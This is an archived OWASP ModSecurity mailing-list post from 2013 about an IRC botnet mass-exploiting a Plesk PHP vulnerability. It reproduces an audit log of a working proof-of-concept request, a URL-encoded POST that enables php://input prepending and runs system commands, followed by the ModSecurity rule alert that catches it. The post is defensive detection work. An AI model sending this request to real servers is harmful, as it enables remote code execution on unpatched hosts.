<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-modsecurity-core-rule-set] IRC BOTNET LEVERAGING UNPATCHED	PLESK VULNERABILITY
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20IRC%20BOTNET%20LEVERAGING%20UNPATCHED%0A%09PLESK%20VULNERABILITY&In-Reply-To=%3CCDDBB68B.A8999%25rbarnett%40trustwave.com%3E">
   <META NAME="robots" CONTENT="index,nofollow">
   <style type="text/css">
       pre {
           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
           }
   </style>
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="001412.html">
   <LINK REL="Next"  HREF="001414.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-modsecurity-core-rule-set] IRC BOTNET LEVERAGING UNPATCHED	PLESK VULNERABILITY</H1>
    <B>Ryan Barnett</B> 
    <A HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20IRC%20BOTNET%20LEVERAGING%20UNPATCHED%0A%09PLESK%20VULNERABILITY&In-Reply-To=%3CCDDBB68B.A8999%25rbarnett%40trustwave.com%3E"
       TITLE="[Owasp-modsecurity-core-rule-set] IRC BOTNET LEVERAGING UNPATCHED	PLESK VULNERABILITY">RBarnett at trustwave.com
       </A><BR>
    <I>Mon Jun 10 20:59:48 UTC 2013</I>
    <P><UL>
        <LI>Previous message: <A HREF="001412.html">[Owasp-modsecurity-core-rule-set] Bing Bot
</A></li>
        <LI>Next message: <A HREF="001414.html">[Owasp-modsecurity-core-rule-set] New Mail-List - ModSecurity	Emerging Attacks
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1413">[ date ]</a>
              <a href="thread.html#1413">[ thread ]</a>
              <a href="subject.html#1413">[ subject ]</a>
              <a href="author.html#1413">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>I wanted to reach out to the community on this issue and ask for some help.

An exploit for Plesk was released last week - <A HREF="http://seclists.org/fulldisclosure/2013/Jun/21">http://seclists.org/fulldisclosure/2013/Jun/21</A> and now there are reports of mass exploits from IRC botnets.  Reference this link - <A HREF="http://threatpost.com/irc-botnet-leveraging-unpatched-plesk-vulnerability/">http://threatpost.com/irc-botnet-leveraging-unpatched-plesk-vulnerability/</A>

Here is an example ModSecurity audit log of running the plesk-simple.pl script against a host -

--c0538227-A--
[10/Jun/2013:16:33:13 --0400] UbY4B8CoAWQAAP3TbGsAAAAC 127.0.0.1 56954 127.0.0.1 80
--c0538227-B--
POST /%70%68%70%70%61%74%68/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +<A HREF="http://www.google.com/bot.html">http://www.google.com/bot.html</A>)
Content-Type: application/x-www-form-urlencoded
Content-Length: 82

--c0538227-C--
&lt;?php echo &quot;Content-Type:text/html\r\n\r\n&quot;;echo &quot;OK\n&quot;;system(&quot;uname -a;id;&quot;); ?&gt;

For those of you running the OWASP ModSecurity CRS &#8211; this attac would already be picked up by a number of rules/signatures.  For example -

Message: Warning. Pattern match &quot;&lt;\\?(?!xml)&quot; at ARGS_NAMES:&lt;?php echo &quot;Content-Type:text/html\\r\\n\\r\\n&quot;;echo &quot;OK\\n&quot;;system(&quot;uname -a;id;&quot;); ?&gt;. [file &quot;/usr/local/apache/conf/crs/base_rules/modsecurity_crs_40_generic_attacks.conf&quot;] [line &quot;230&quot;] [id &quot;959151&quot;] [rev &quot;2&quot;] [msg &quot;PHP Injection Attack&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/2.2.7&quot;] [maturity &quot;9&quot;] [accuracy &quot;9&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/PHP_INJECTION&quot;] [tag &quot;WASCTC/WASC-15&quot;] [tag &quot;OWASP_TOP_10/A6&quot;] [tag &quot;PCI/6.5.2&quot;] [tag &quot;WASCTC/WASC-25&quot;] [tag &quot;OWASP_TOP_10/A1&quot;] [tag &quot;OWASP_AppSensor/CIE4&quot;] [tag &quot;PCI/6.5.2&quot;]

I am working on a blog post to highlight this vulnerability and the ModSecurity protections.  It would be useful if anyone who has seen these attacks hit their server to send me some example audit log entries as I want to show real-world instances vs only running the PoC.

Thanks.

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: &lt;<A HREF="http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20130610/a0ed0e70/attachment.html">http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20130610/a0ed0e70/attachment.html</A>&gt;
</PRE>


<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="001412.html">[Owasp-modsecurity-core-rule-set] Bing Bot
</A></li>
	<LI>Next message: <A HREF="001414.html">[Owasp-modsecurity-core-rule-set] New Mail-List - ModSecurity	Emerging Attacks
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1413">[ date ]</a>
              <a href="thread.html#1413">[ thread ]</a>
              <a href="subject.html#1413">[ subject ]</a>
              <a href="author.html#1413">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">More information about the Owasp-modsecurity-core-rule-set
mailing list</a><br>
</body></html>
